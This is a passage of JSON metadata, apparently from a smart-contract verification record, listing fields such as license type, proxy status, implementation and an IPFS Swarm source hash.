"Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f1c37152d4c67bfcdf658a6291cea56b39009d664b75ce18cc4fdd61db41a0e8"}